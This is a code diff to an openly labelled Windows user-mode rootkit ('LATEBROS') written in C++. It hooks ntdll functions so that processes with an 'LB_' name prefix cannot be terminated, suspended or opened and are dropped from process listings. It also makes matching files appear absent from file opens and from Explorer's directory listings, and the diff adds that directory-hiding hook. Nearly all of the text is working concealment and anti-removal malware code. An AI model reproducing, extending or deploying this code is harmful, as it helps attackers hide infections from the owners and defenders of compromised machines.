@@ -1,5 +1,7 @@
 ﻿#include "stdafx.h"
 #include "detour.hpp"
+#include <fstream>
+#define ROOTKIT_PREFIX L"LB_"
 
 /*
 * Function: ntdll!NtTerminateProcess
@@ -27,7 +29,8 @@ extern "C" NTSTATUS __declspec(dllexport) NTAPI ntterm(HANDLE process_handle, NT
 	CloseHandle(temp_handle);
 
 	// 'INFECTED' PROCESS IS TRYING TO OPEN A HANDLE TO A LATEBROS PROCESS
-	if (success && name_buffer[0] == L'_')
+	std::wstring name = name_buffer;
+	if (success && name.find(ROOTKIT_PREFIX) != std::wstring::npos)
 		return STATUS_ACCESS_DENIED; // RETURN ACCESS DENIED
 
 	auto function_pointer = reinterpret_cast<uintptr_t>(GetProcAddress(GetModuleHandleA("ntdll"), "NtTerminateProcess"));
@@ -70,7 +73,8 @@ extern "C" NTSTATUS __declspec(dllexport) NTAPI ntsusp(HANDLE process_handle)
 	CloseHandle(temp_handle);
 
 	// 'INFECTED' PROCESS IS TRYING TO OPEN A HANDLE TO A LATEBROS PROCESS
-	if (success && name_buffer[0] == L'_')
+	std::wstring name = name_buffer;
+	if (success && name.find(ROOTKIT_PREFIX) != std::wstring::npos)
 		return STATUS_ACCESS_DENIED; // RETURN ACCESS DENIED
 
 	auto function_pointer = reinterpret_cast<uintptr_t>(GetProcAddress(GetModuleHandleA("ntdll"), "NtSuspendProcess"));
@@ -111,7 +115,8 @@ extern "C" NTSTATUS __declspec(dllexport) NTAPI ntop(PHANDLE out_handle, ACCESS_
 	if (GetModuleBaseNameW(*out_handle, nullptr, name_buffer, MAX_PATH))
 	{
 		// 'INFECTED' PROCESS IS TRYING TO OPEN A HANDLE TO A LATEBROS PROCESS
-		if (name_buffer[0] == L'_')
+		std::wstring name = name_buffer;
+		if (name.find(ROOTKIT_PREFIX) != std::wstring::npos)
 		{
 			CloseHandle(*out_handle);		// CLOSE HANDLE TO ENSURE IT WON'T BE USED REGARDLESS OF SANITY CHECKS
 			*out_handle = 0;				// ERASE PASSED HANLDE
@@ -170,10 +175,11 @@ extern "C" NTSTATUS __declspec(dllexport) WINAPI qsi(SYSTEM_INFORMATION_CLASS sy
 			if (entry->ImageName.Buffer)
 			{
 				// SKIP PROTECTED ENTRIES
-				if (entry->ImageName.Buffer[0] == L'_')
+				std::wstring name = entry->ImageName.Buffer;
+				if (name.find(ROOTKIT_PREFIX) != std::wstring::npos)
 				{
 					previous_entry->NextEntryOffset += entry->NextEntryOffset;	// MAKE PREVIOUS ENTRY POINT TO THE NEXT ENTRY
-					ZeroMemory(entry, sizeof(_SYSTEM_PROCESS_INFO));			// CLEAR OUR ENTRY, WHY NOT?
+					//ZeroMemory(entry, sizeof(_SYSTEM_PROCESS_INFO));			// CLEAR OUR ENTRY, WHY NOT?
 				}
 			}
 
@@ -200,7 +206,7 @@ extern "C" NTSTATUS __declspec(dllexport) NTAPI ntcr(
 	{
 		std::wstring file_name = object_attributes->ObjectName->Buffer;
 
-		if (file_name.find(L"LATEBROS_") != std::wstring::npos)
+		if (file_name.find(ROOTKIT_PREFIX) != std::wstring::npos)
 			return STATUS_NOT_FOUND;
 	}
 
@@ -230,7 +236,7 @@ extern "C" NTSTATUS __declspec(dllexport) NTAPI ntopf(PHANDLE file_handle, ACCES
 	{
 		std::wstring file_name = object_attributes->ObjectName->Buffer;
 
-		if (file_name.find(L"LATEBROS_") != std::wstring::npos)
+		if (file_name.find(ROOTKIT_PREFIX) != std::wstring::npos)
 			return STATUS_NOT_FOUND;
 	}
 
@@ -244,6 +250,59 @@ extern "C" NTSTATUS __declspec(dllexport) NTAPI ntopf(PHANDLE file_handle, ACCES
 
 	// REHOOK
 	detour::hook_function(function_pointer, reinterpret_cast<uintptr_t>(ntopf));
+
+	return result;
+}
+
+/*
+* Function: ntdll!NtQueryDirectoryFile
+* Purpose: Hide any LATEBROS files from directory enumeration
+*
+*/
+// UNDOCUMENTED STRUCT, HAD TO DO IT MYSELF
+struct FILE_OLE_DIR_INFORMATION {
+	uint32_t	next_entry_offset;	// 0x00 (0x04)
+	char		pad_0[0x64];		// 0x04 (0x64)
+	wchar_t		file_name[1];		// 0x68
+};
+typedef NTSTATUS(NTAPI *NtQueryDirectoryFile_t)(HANDLE file_handle, HANDLE event, PIO_APC_ROUTINE apc_routine, PVOID apc_context, PIO_STATUS_BLOCK io_status_block, PVOID file_information, ULONG length, FILE_INFORMATION_CLASS file_information_class, BOOLEAN return_single_entry, PUNICODE_STRING file_name, BOOLEAN restart_scan);
+extern "C" char __declspec(dllexport) ntqdf_og[0xF] = {}; // ORIGINAL BYTES
+extern "C" NTSTATUS __declspec(dllexport) NTAPI ntqdf(HANDLE file_handle, HANDLE event, PIO_APC_ROUTINE apc_routine, PVOID apc_context, PIO_STATUS_BLOCK io_status_block, PVOID file_information, ULONG length, FILE_INFORMATION_CLASS file_information_class, BOOLEAN return_single_entry, PUNICODE_STRING file_name, BOOLEAN restart_scan)
+{
+	auto function_pointer = reinterpret_cast<uintptr_t>(GetProcAddress(GetModuleHandleA("ntdll"), "NtQueryDirectoryFile"));
+
+	// RESTORE
+	detour::remove_detour(function_pointer, ntqdf_og, sizeof(ntqdf_og));
+
+	// CALL	
+	auto result = reinterpret_cast<NtQueryDirectoryFile_t>(function_pointer)(file_handle, event, apc_routine, apc_context, io_status_block, file_information, length, file_information_class, return_single_entry, file_name, restart_scan);
+
+	// REHOOK
+	detour::hook_function(function_pointer, reinterpret_cast<uintptr_t>(ntqdf));
+
+	// HIDE FILES / DIRECTORIES
+	if (result == STATUS_SUCCESS)
+	{
+		// EXPLORER CALLS NTQUERYDIRECTORYFILE WITH CLASS 37, STRUCT WASN'T DOCUMENTED NOR ON ANY NT BLOGS 
+		// SO I HAD TO FIND THE IMPORTANT MEMBERS MYSELF
+		if (file_information_class == 37/*FileOleDirectoryInformation*/)
+		{
+			auto current_entry = reinterpret_cast<FILE_OLE_DIR_INFORMATION*>(file_information);
+			auto previous_entry = current_entry;
+
+			while (current_entry->next_entry_offset)
+			{
+				std::wstring file_name = current_entry->file_name;
+				if (file_name.find(ROOTKIT_PREFIX) != std::wstring::npos)
+				{
+					previous_entry->next_entry_offset += current_entry->next_entry_offset;	// SKIP
+				}
+
+				previous_entry = current_entry;
+				current_entry = reinterpret_cast<FILE_OLE_DIR_INFORMATION*>(reinterpret_cast<uintptr_t>(current_entry) + current_entry->next_entry_offset);
+			}
+		}
+	}
 
 	return result;
 }
